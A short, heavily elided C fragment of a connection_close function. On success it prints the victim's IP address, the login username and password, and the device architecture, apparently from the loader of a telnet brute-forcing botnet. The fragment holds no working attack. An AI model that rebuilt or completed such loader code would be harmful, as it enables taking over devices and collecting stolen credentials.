...
void connection_close(struct connection *conn)
{
    ...
    if (conn->open)
    {
        ...
        if (conn->success)
        {
			...
			fprintf(stderr, "\033[90m[\033[91mSuccess\033[90m] [\033[95m%d\033[96m.\033[95m%d\033[96m.\033[95m%d\033[96m.\033[95m%d\033[90m] [\033[95m%s\033[96m:\033[95m%s\033[90m] [\033[95m%s\033[90m]\033[0m\n\033[0m", conn->info.addr & 0xff, (conn->info.addr >> 8) & 0xff, (conn->info.addr >> 16) & 0xff, (conn->info.addr >> 24) & 0xff, conn->info.user, conn->info.pass, conn->info.arch);        
		} else {
